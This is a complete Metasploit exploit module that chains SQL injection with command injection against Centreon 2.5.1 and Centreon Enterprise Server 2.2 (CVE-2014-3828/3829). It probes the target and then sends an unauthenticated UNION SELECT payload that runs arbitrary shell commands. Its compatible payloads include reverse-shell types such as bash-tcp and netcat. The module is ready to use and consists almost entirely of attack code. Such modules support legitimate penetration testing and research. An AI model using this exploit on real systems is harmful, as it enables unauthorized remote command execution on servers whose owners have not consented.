# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Centreon SQL and Command Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits several vulnerabilities on Centreon 2.5.1 and prior and Centreon
        Enterprise Server 2.2 and prior. Due to a combination of SQL injection and command
        injection in the displayServiceStatus.php component, it is possible to execute arbitrary
        commands as long as there is a valid session registered in the centreon.session table.
        In order to have a valid session, all it takes is a successful login from anybody.
        The exploit itself does not require any authentication.
        This module has been tested successfully on Centreon Enterprise Server 2.2.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;MaZ&#039;, # Vulnerability Discovery and Analysis
          &#039;juan vazquez&#039; # Metasploit Module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-3828&#039;],
          [&#039;CVE&#039;, &#039;2014-3829&#039;],
          [&#039;US-CERT-VU&#039;, &#039;298796&#039;],
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2014/Oct/78&#039;]
        ],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 1500, # having into account 8192 as max URI length
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd cmd_bash&#039;,
              &#039;RequiredCmd&#039; => &#039;generic python gawk bash-tcp netcat ruby openssl&#039;
            }
        },
      &#039;Targets&#039;        =>
        [
          [&#039;Centreon Enterprise Server 2.2&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Oct 15 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the Centreon Application&#039;, &#039;/centreon&#039;])
      ], self.class)
  end
 
  def check
    random_id = rand_text_numeric(5 + rand(8))
    res = send_session_id(random_id)
 
    unless res && res.code == 200 && res.headers[&#039;Content-Type&#039;] && res.headers[&#039;Content-Type&#039;] == &#039;image/gif&#039;
      return Exploit::CheckCode::Safe
    end
 
    injection = "#{random_id}&#039; or &#039;a&#039;=&#039;a"
    res = send_session_id(injection)
 
    if res && res.code == 200
      if res.body && res.body.to_s =~ /sh: graph: command not found/
        return Exploit::CheckCode::Vulnerable
      elsif res.headers[&#039;Content-Type&#039;] && res.headers[&#039;Content-Type&#039;] == &#039;image/gif&#039;
        return Exploit::CheckCode::Detected
      end
    end
 
    Exploit::CheckCode::Safe
  end
 
  def exploit
    if check == Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable, "#{peer} - The SQLi cannot be exploited")
    elsif check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - The SQLi cannot be exploited. Possibly because there&#039;s nothing in the centreon.session table. Perhaps try again later?")
    end
 
    print_status("Exploiting...")
    random_id = rand_text_numeric(5 + rand(8))
    random_char = rand_text_alphanumeric(1)
    session_injection = "#{random_id}&#039; or &#039;#{random_char}&#039;=&#039;#{random_char}"
    template_injection = "&#039; UNION ALL SELECT 1,2,3,4,5,CHAR(59,#{mysql_payload}59),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 -- /**"
    res = send_template_id(session_injection, template_injection)
 
    if res && res.body && res.body.to_s =~ /sh: --imgformat: command not found/
      vprint_status("Output: #{res.body}")
    end
  end
 
  def send_session_id(session_id)
    res = send_request_cgi(
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.to_s, &#039;include&#039;, &#039;views&#039;, &#039;graphs&#039;, &#039;graphStatus&#039;, &#039;displayServiceStatus.php&#039;),
      &#039;vars_get&#039; =>
        {
          &#039;session_id&#039; => session_id
        }
    )
 
    res
  end
 
  def send_template_id(session_id, template_id)
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.to_s, &#039;include&#039;, &#039;views&#039;, &#039;graphs&#039;, &#039;graphStatus&#039;, &#039;displayServiceStatus.php&#039;),
      &#039;vars_get&#039; =>
        {
          &#039;session_id&#039; => session_id,
          &#039;template_id&#039; => template_id
        }
      }, 3)
 
    res
  end
 
  def mysql_payload
    p = &#039;&#039;
    payload.encoded.each_byte { |c| p << "#{c},"}
    p
  end
 
end

